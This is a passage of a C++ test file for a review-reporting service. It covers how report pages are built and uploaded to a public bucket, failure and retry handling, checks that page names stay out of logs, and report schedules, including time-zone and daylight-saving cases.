                            R"({"period_start": "2026-11-09", "period_end": "2026-11-09", "time_zone": "Asia/Tokyo"})");
    ASSERT_EQ(tokyo.status, 201u);
    EXPECT_EQ(json(tokyo).at("time_zone").as_string(), "Asia/Tokyo");
    EXPECT_EQ(json(tokyo).at("status").as_string(), "building");
}

// ---- the page in the bucket -------------------------------------------------------------

TEST_F(Reports, ABuildNamesThePageBeforeItUploadsIt) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    // The connection to the bucket drops: the attempt throws, and the name is on the row.
    public_.unreachable = true;
    const auto id = generate(chelsea_);
    EXPECT_EQ(status(id), "building");
    const auto name = page_object(id);
    // 32 random bytes as 43 characters, and nothing else: no location, no report number, no date.
    EXPECT_TRUE(std::regex_match(name, std::regex(R"(r/[A-Za-z0-9_-]{43}\.html)"))) << name;
    EXPECT_TRUE(public_.objects.empty());

    // The next attempt puts the page under the same name.
    public_.unreachable = false;
    clock_.advance(2h);
    run_jobs();
    const auto built = report(id);
    EXPECT_EQ(built.at("status").as_string(), "ready");
    EXPECT_EQ(page_object(id), name);
    ASSERT_EQ(public_.objects.size(), 1u);
    EXPECT_TRUE(public_.objects.contains(name));
    EXPECT_EQ(built.at("url").as_string(), std::string(kPublicBase) + name);
    EXPECT_TRUE(built.at("archive_url").is_null());
}

TEST_F(Reports, ABuildWhoseUploadsAreRefusedFailsAndSaysNothingOfTheObject) {
    // What a person's rule for system problems would be sent.
    const auto rule = post("/api/notification-rules", R"({"event_type": "system_problem", "recipients": ["ops@example.com"]})");
    ASSERT_EQ(rule.status, 201u) << rule.body;
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    public_.refuse = true;
    const auto response = post(std::format("/api/locations/{}/reports", chelsea_), R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    ASSERT_EQ(response.status, 201u) << response.body;
    const auto id = json(response).at("id").as_int64();
    // The workers of the engine: a job given up on is a system problem.
    jobs::Worker worker(io_.get_executor(), queue(), registry_,
                        {.id = "test-worker", .on_permanent_failure = [this](jobs::Job job, std::string error) -> boost::asio::awaitable<void> {
                             co_await db().tx([job = std::move(job), error = std::move(error), now = clock_.now()](pqxx::work& tx) {
                                 repo::emit_job_failed(tx, job, error, now);
                             });
                         }});
    for (int attempt = 0; attempt < repo::kBuildReportAttempts; ++attempt) {
        while (await(worker.run_once())) {
        }
        clock_.advance(2h);
    }

    const auto failed = report(id);
    EXPECT_EQ(failed.at("status").as_string(), "failed");
    EXPECT_EQ(failed.at("error").as_string(), "The report's page could not be put into the public bucket. (HTTP 403)");
    EXPECT_TRUE(failed.at("url").is_null());
    // The name stays: an upload of the page was begun.
    const auto name = page_object(id);
    ASSERT_FALSE(name.empty());
    EXPECT_EQ(public_.puts, repo::kBuildReportAttempts);
    EXPECT_TRUE(public_.objects.empty());
    ASSERT_EQ(count("notification_deliveries WHERE event_type = 'system_problem'"), 1);
    for (const auto& text : {name, std::string("scripted refusal")}) {
        EXPECT_EQ(count(std::format("reports WHERE error LIKE '%{}%'", text)), 0) << text;
        EXPECT_EQ(count(std::format("jobs WHERE last_error LIKE '%{}%'", text)), 0) << text;
        EXPECT_EQ(count(std::format("notification_deliveries WHERE body LIKE '%{}%'", text)), 0) << text;
    }
}

TEST_F(Reports, NoAuditEntryAndNoJobNamesAReportsPage) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto built = generate(chelsea_);
    public_.refuse = true;
    const auto refused = generate(chelsea_);
    for (int attempt = 1; attempt < repo::kBuildReportAttempts; ++attempt) {
        clock_.advance(2h);
        run_jobs();
    }
    ASSERT_EQ(status(built), "ready");
    ASSERT_EQ(status(refused), "failed");
    for (const auto id : {built, refused}) {
        const auto name = page_object(id);
        ASSERT_FALSE(name.empty());
        EXPECT_EQ(count(std::format("audit_log WHERE object_type = 'report' AND object_id = '{}'", id)), 1);
        EXPECT_EQ(count(std::format("audit_log WHERE coalesce(before::text, '') || coalesce(after::text, '') LIKE '%{}%'", name)), 0);
        EXPECT_EQ(count(std::format("jobs WHERE coalesce(last_error, '') || payload::text LIKE '%{}%'", name)), 0);
    }
}

TEST_F(Reports, ARunThatFindsTheReportNoLongerBuildingPutsNothing) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto response = post(std::format("/api/locations/{}/reports", chelsea_), R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    ASSERT_EQ(response.status, 201u) << response.body;
    const auto id = json(response).at("id").as_int64();
    // While the model writes the summary, the stalled-report sweep (or another run) has settled the report.
    llm_.summary = [&](const llm::ChatRequest&) {
        exec(std::format("UPDATE reports SET status = 'failed', error = 'overtaken' WHERE id = {}", id));
        return FakeLlm::json_answer(FakeLlm::kPlainSummary);
    };
    run_jobs();
    EXPECT_EQ(llm_.calls("summary"), 1u);
    EXPECT_EQ(public_.puts, 0);
    EXPECT_EQ(status(id), "failed");
    EXPECT_TRUE(page_object(id).empty());
    EXPECT_EQ(count(std::format("reports WHERE id = {} AND data IS NULL", id)), 1);
}

TEST_F(Reports, AnAttemptThatFailsBeforeTheUploadNamesNoPage) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    performance_.failures.push_back({google::ApiError::Kind::unavailable, 503, "backend error"});
    const auto id = generate(chelsea_);
    EXPECT_EQ(status(id), "building");
    EXPECT_TRUE(page_object(id).empty());
    EXPECT_EQ(public_.puts, 0);
}

TEST_F(Reports, AReportHasAnAddressOnlyWhileItIsReady) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    const auto ready = generate(chelsea_);
    const auto building = json(post(std::format("/api/locations/{}/reports", chelsea_),
                                    R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"))
                              .at("id")
                              .as_int64();
    const auto failed = json(post(std::format("/api/locations/{}/reports", chelsea_),
                                  R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"))
                            .at("id")
                            .as_int64();
    exec(std::format("UPDATE reports SET status = 'failed', error = 'broken' WHERE id = {}", failed));
    for (const auto& item : read(std::format("/api/reports?location_id={}", chelsea_)).at("items").as_array()) {
        const auto id = item.at("id").as_int64();
        EXPECT_TRUE(item.at("archive_url").is_null()) << id;
        EXPECT_EQ(item.at("auto_send_status").as_string(), "off") << id;
        if (id == ready) {
            EXPECT_EQ(item.at("url").as_string(), std::string(kPublicBase) + page_object(ready));
        } else {
            EXPECT_TRUE(id == building || id == failed) << id;
            EXPECT_TRUE(item.at("url").is_null()) << id;
        }
    }
}

TEST_F(Reports, WithoutAPublicBucketNoReportIsStarted) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    // A report asked for while there was a bucket, built by an engine that has none.
    const auto asked = json(post(std::format("/api/locations/{}/reports", chelsea_),
                                 R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"))
                           .at("id")
                           .as_int64();
    const auto schedule_id = schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    start(false);

    const auto refused = post(std::format("/api/locations/{}/reports", chelsea_), R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    EXPECT_EQ(refused.status, 409u);
    EXPECT_EQ(error_code(refused), "no_public_bucket");
    EXPECT_EQ(count("reports"), 1);

    // One run of its job, and it has failed with the reason; nothing is retried.
    run_jobs();
    const auto failed = report(asked);
    EXPECT_EQ(failed.at("status").as_string(), "failed");
    EXPECT_THAT(std::string(failed.at("error").as_string()), HasSubstr("No public bucket is configured"));
    EXPECT_EQ(count("jobs WHERE kind = 'reports.build' AND status = 'succeeded' AND attempts = 1"), 1);
    EXPECT_TRUE(page_object(asked).empty());
    EXPECT_EQ(public_.puts, 0);

    // A schedule's time comes, and nothing is started.
    clock_.advance(2h);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    EXPECT_EQ(count("reports"), 1);
    EXPECT_TRUE(listed_schedule(schedule_id).at("last_run_on").is_null());
}

TEST_F(Reports, ARuleForALocationsReportsMustNameALocation) {
    const auto all = post("/api/notification-rules", R"({"event_type": "location_report", "recipients": ["everyone@example.com"]})");
    EXPECT_EQ(all.status, 400u) << all.body;
    EXPECT_THAT(all.body, HasSubstr("must name the location"));
    const auto none = post("/api/notification-rules",
                           R"({"event_type": "location_report", "location_id": null, "recipients": ["everyone@example.com"]})");
    EXPECT_EQ(none.status, 400u) << none.body;
    EXPECT_EQ(error_code(post("/api/notification-rules",
                              R"({"event_type": "location_report", "location_id": 999999, "recipients": ["x@example.com"]})")),
              "location_not_found");
    // The database holds the same rule, whatever the code does.
    EXPECT_THROW(exec("INSERT INTO notification_rules (event_type, recipients, created_at, updated_at) "
                      "VALUES ('location_report', '[\"x@example.com\"]', now(), now())"),
                 pqxx::check_violation);
    EXPECT_THROW(exec("INSERT INTO notification_rules (event_type, location_id, recipients, created_at, updated_at) "
                      "VALUES ('client_report', 1, '[\"x@example.com\"]', now(), now())"),
                 pqxx::check_violation);
}

// A switched-off location gets no report (D-102): none is made, built, sent or scheduled.
TEST_F(Reports, ASwitchedOffLocationGetsNoReport) {
    add_review(chelsea_, "a1", 5, "2026-10-05T15:00:00Z", "Lovely");
    generate(chelsea_);
    const auto pages = public_.puts;
    schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    const auto building = json(post(std::format("/api/locations/{}/reports", chelsea_),
                                    R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})"))
                              .at("id")
                              .as_int64();
    switch_location(chelsea_, false);

    const auto made = post(std::format("/api/locations/{}/reports", chelsea_), R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    EXPECT_EQ(made.status, 400u);
    EXPECT_THAT(error_message(made), HasSubstr("switched off"));
    const auto scheduled = post("/api/report-schedules",
                                std::format(R"({{"location_id": {}, "frequency": "daily", "time": "09:00", "time_zone": "UTC"}})", chelsea_));
    EXPECT_EQ(scheduled.status, 400u);
    // A report asked for before it was switched off is not built.
    run_jobs();
    EXPECT_EQ(status(building), "failed");
    EXPECT_THAT(std::string(report(building).at("error").as_string()), HasSubstr("switched off"));
    // Its schedule's time comes, and nothing is made.
    clock_.advance(2h);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    EXPECT_EQ(count("notification_deliveries"), 0);
    EXPECT_EQ(public_.puts, pages);
}

TEST_F(Reports, AReportWhoseJobIsGoneDoesNotStayBuildingForEver) {
    const auto response = post(std::format("/api/locations/{}/reports", chelsea_),
                               R"({"period_start": "2026-10-01", "period_end": "2026-10-31"})");
    const auto id = json(response).at("id").as_int64();
    // The engine stopped during the job's last attempt: the job is gone and nothing will finish the report.
    exec("DELETE FROM jobs WHERE kind = 'reports.build'");
    clock_.advance(59min);
    await(reporter_->start_due());
    EXPECT_EQ(status(id), "building");
    clock_.advance(2min);
    await(reporter_->start_due());
    const auto failed = report(id);
    EXPECT_EQ(failed.at("status").as_string(), "failed");
    EXPECT_THAT(std::string(failed.at("error").as_string()), HasSubstr("did not finish"));
}

// ---- schedules --------------------------------------------------------------------------

TEST_F(Reports, AScheduleBuildsOneReportPerRunInItsOwnTimeZone) {
    // The clock: 2026-11-10 12:00 UTC, which is 07:00 in New York. A daily schedule at 09:00.
    const auto id = schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    EXPECT_EQ(await(reporter_->start_due()), 0);  // 09:00 has not come
    clock_.advance(2h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(await(reporter_->start_due()), 0);  // once per run, however often the job looks
    run_jobs();

    const auto listed = read(std::format("/api/reports?location_id={}", chelsea_));
    ASSERT_EQ(listed.at("total").as_int64(), 1);
    const auto& made = listed.at("items").at(0);
    EXPECT_EQ(made.at("period_start").as_string(), "2026-11-09");
    EXPECT_EQ(made.at("period_end").as_string(), "2026-11-09");
    EXPECT_EQ(made.at("schedule_id").as_int64(), id);
    EXPECT_TRUE(made.at("requested_by").is_null());
    EXPECT_EQ(made.at("status").as_string(), "ready");
    EXPECT_EQ(listed_schedule(id).at("last_run_on").as_string(), "2026-11-10");
    EXPECT_EQ(count("audit_log WHERE action = 'report.create' AND actor = 'system:report-schedule'"), 1);

    // The next day, once.
    clock_.advance(24h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    // After a long stop only the latest run is made up for.
    clock_.advance(24h * 5);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(count("reports"), 3);
    EXPECT_EQ(value<std::string>("SELECT period_start::text FROM reports ORDER BY id DESC LIMIT 1"), "2026-11-15");
}

TEST_F(Reports, AScheduleMadeOrChangedAfterItsTimeDoesNotRunForIt) {
    clock_.advance(3h);  // 10:00 in New York
    const auto id = schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    EXPECT_EQ(await(reporter_->start_due()), 0);
    // Moved to 08:00 at 10:30: no run today for a time that has passed.
    clock_.advance(30min);
    ASSERT_EQ(patch(std::format("/api/report-schedules/{}", id), R"({"time": "08:00"})").status, 200u);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    clock_.advance(24h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
}

TEST_F(Reports, WeeklyAndMonthlySchedulesCoverTheWeekAndTheMonthBefore) {
    schedule(chelsea_, R"("frequency": "weekly", "weekday": 3, "time": "08:00", "time_zone": "America/New_York")");
    schedule(buffet_, R"("frequency": "monthly", "month_day": 5, "time": "09:00", "time_zone": "America/New_York")");
    // Wednesday November 11 at 08:00 in New York, then December 5.
    clock_.set(test::t0() + 25h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
    EXPECT_EQ(value<std::string>("SELECT period_start::text || '..' || period_end::text FROM reports ORDER BY id DESC LIMIT 1"),
              "2026-11-04..2026-11-10");
    clock_.set(core::TimePoint(std::chrono::sys_days{std::chrono::year{2026} / 12 / 5} + 14h));
    EXPECT_EQ(await(reporter_->start_due()), 2);  // the monthly one, and the weekly one's latest run
    EXPECT_EQ(value<std::string>(std::format(
                  "SELECT period_start::text || '..' || period_end::text FROM reports WHERE location_id = {} ORDER BY id DESC LIMIT 1",
                  buffet_)),
              "2026-11-01..2026-11-30");
}

TEST_F(Reports, ADailyScheduleRunsOnceOnTheDaysClocksChange) {
    // 01:30 in New York exists twice on 2026-11-01 and 02:30 does not exist on 2027-03-14.
    schedule(chelsea_, R"("frequency": "daily", "time": "01:30", "time_zone": "America/New_York")");
    schedule(buffet_, R"("frequency": "daily", "time": "02:30", "time_zone": "America/New_York")");
    exec("UPDATE report_schedules SET created_at = '2026-10-01T00:00:00Z', updated_at = '2026-10-01T00:00:00Z'");
    const auto at = [](int y, unsigned m, unsigned d, std::chrono::minutes time) {
        return core::TimePoint(std::chrono::sys_days{std::chrono::year{y} / m / d} + time);
    };
    const auto runs = [&](std::int64_t location) { return count(std::format("reports WHERE location_id = {}", location)); };

    clock_.set(at(2026, 11, 1, 5h + 29min));
    await(reporter_->start_due());  // the runs of October 31, to start from a known state
    const auto spa_before = runs(chelsea_);
    clock_.set(at(2026, 11, 1, 5h + 30min));  // the first 01:30 (EDT)
    await(reporter_->start_due());
    EXPECT_EQ(runs(chelsea_), spa_before + 1);
    clock_.set(at(2026, 11, 1, 6h + 30min));  // the second 01:30 (EST): no second report
    await(reporter_->start_due());
    EXPECT_EQ(runs(chelsea_), spa_before + 1);

    clock_.set(at(2027, 3, 14, 6h + 59min));
    await(reporter_->start_due());
    const auto buffet_before = runs(buffet_);
    clock_.set(at(2027, 3, 14, 7h));  // 03:00 EDT, the first moment after the gap
    await(reporter_->start_due());
    EXPECT_EQ(runs(buffet_), buffet_before + 1);
    EXPECT_EQ(value<std::string>(std::format("SELECT period_start::text FROM reports WHERE location_id = {} ORDER BY id DESC LIMIT 1",
                                             buffet_)),
              "2027-03-13");
}

// Whether a report is to be sent by itself is on the report; nothing sends it yet.
TEST_F(Reports, AScheduleSendsByItselfOnlyWhereAPersonSaidSo) {
    add_review(chelsea_, "a1", 5, "2026-11-09T15:00:00Z", "Lovely");
    recipients(chelsea_, R"(["owner@spa.example"])");
    sending_on();
    const auto by_itself = schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York", "auto_send": true)");
    EXPECT_TRUE(listed_schedule(by_itself).at("auto_send").as_bool());
    const auto waits = schedule(uptown_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    clock_.advance(2h);
    ASSERT_EQ(await(reporter_->start_due()), 2);
    const auto by_hand = generate(chelsea_);
    run_jobs();

    const auto auto_send = [&](std::string_view where) {
        return value<std::string>(std::format("SELECT auto_send_status FROM reports WHERE {}", where));
    };
    EXPECT_EQ(auto_send(std::format("schedule_id = {}", by_itself)), "pending");
    EXPECT_EQ(auto_send(std::format("schedule_id = {}", waits)), "off");
    EXPECT_EQ(report(by_hand).at("auto_send_status").as_string(), "off");
    EXPECT_EQ(count("reports WHERE status = 'ready'"), 3);
    EXPECT_TRUE(channel_.sent.empty());
    EXPECT_EQ(count("notification_deliveries"), 0);
}

TEST_F(Reports, ADisabledScheduleAndASwitchedOffLocationRunNothing) {
    const auto off = schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York", "enabled": false)");
    schedule(buffet_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    switch_location(buffet_, false);
    clock_.advance(2h);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    // Switched on at 09:00 sharp or later: its next run is tomorrow's.
    ASSERT_EQ(patch(std::format("/api/report-schedules/{}", off), R"({"enabled": true})").status, 200u);
    EXPECT_EQ(await(reporter_->start_due()), 0);
    clock_.advance(24h);
    EXPECT_EQ(await(reporter_->start_due()), 1);
}

TEST_F(Reports, SchedulesAreMadeChangedAndDeletedByPeople) {
    const auto bad = [&](const std::string& rest) {
        return post("/api/report-schedules", std::format(R"({{"location_id": {}, {}}})", chelsea_, rest)).status;
    };
    EXPECT_EQ(bad(R"("frequency": "hourly", "time": "09:00", "time_zone": "America/New_York")"), 400u);
    EXPECT_EQ(bad(R"("frequency": "weekly", "time": "09:00", "time_zone": "America/New_York")"), 400u);  // no weekday
    EXPECT_EQ(bad(R"("frequency": "monthly", "month_day": 31, "time": "09:00", "time_zone": "America/New_York")"), 400u);
    EXPECT_EQ(bad(R"("frequency": "daily", "time": "25:00", "time_zone": "America/New_York")"), 400u);
    EXPECT_EQ(bad(R"("frequency": "daily", "time": "09:00", "time_zone": "Eastern")"), 400u);
    EXPECT_EQ(post("/api/report-schedules", R"({"location_id": 999999, "frequency": "daily", "time": "09:00", "time_zone": "UTC"})").status,
              404u);

    const auto id = schedule(chelsea_, R"("frequency": "weekly", "weekday": 1, "time": "08:30", "time_zone": "America/New_York")");
    auto made = listed_schedule(id);
    EXPECT_EQ(made.at("time").as_string(), "08:30");
    EXPECT_EQ(made.at("weekday").as_int64(), 1);
    EXPECT_FALSE(made.at("auto_send").as_bool());  // off unless a person says otherwise
    EXPECT_TRUE(made.at("enabled").as_bool());
    // A second schedule for the same location is fine.
    schedule(chelsea_, R"("frequency": "monthly", "month_day": 5, "time": "09:00", "time_zone": "America/New_York")");
    EXPECT_EQ(read("/api/report-schedules").at("total").as_int64(), 2);

    // Weekly to monthly: the weekday goes, the day of the month is needed.
    EXPECT_EQ(patch(std::format("/api/report-schedules/{}", id), R"({"frequency": "monthly"})").status, 400u);
    const auto changed = patch(std::format("/api/report-schedules/{}", id), R"({"frequency": "monthly", "month_day": 10, "auto_send": true})");
    ASSERT_EQ(changed.status, 200u) << changed.body;
    EXPECT_TRUE(json(changed).at("weekday").is_null());
    EXPECT_EQ(json(changed).at("month_day").as_int64(), 10);
    EXPECT_EQ(count("audit_log WHERE action = 'report_schedule.update'"), 1);
    // The same values again: nothing changed, nothing recorded.
    EXPECT_EQ(patch(std::format("/api/report-schedules/{}", id), R"({"auto_send": true})").status, 200u);
    EXPECT_EQ(count("audit_log WHERE action = 'report_schedule.update'"), 1);

    EXPECT_EQ(call(verb::delete_, std::format("/api/report-schedules/{}", id), browser_).status, 204u);
    EXPECT_TRUE(listed_schedule(id).is_null());
    EXPECT_EQ(call(verb::delete_, std::format("/api/report-schedules/{}", id), browser_).status, 404u);
    EXPECT_EQ(count("audit_log WHERE action = 'report_schedule.delete'"), 1);
}

TEST_F(Reports, ADeletedScheduleLeavesItsReports) {
    const auto id = schedule(chelsea_, R"("frequency": "daily", "time": "09:00", "time_zone": "America/New_York")");
    clock_.advance(2h);
    ASSERT_EQ(await(reporter_->start_due()), 1);
    run_jobs();
    EXPECT_EQ(call(verb::delete_, std::format("/api/report-schedules/{}", id), browser_).status, 204u);
    const auto listed = read("/api/reports");
    ASSERT_EQ(listed.at("total").as_int64(), 1);
    EXPECT_TRUE(listed.at("items").at(0).at("schedule_id").is_null());
    EXPECT_EQ(read("/api/reports?status=ready").at("total").as_int64(), 1);
    EXPECT_EQ(read("/api/reports?status=failed").at("total").as_int64(), 0);
}
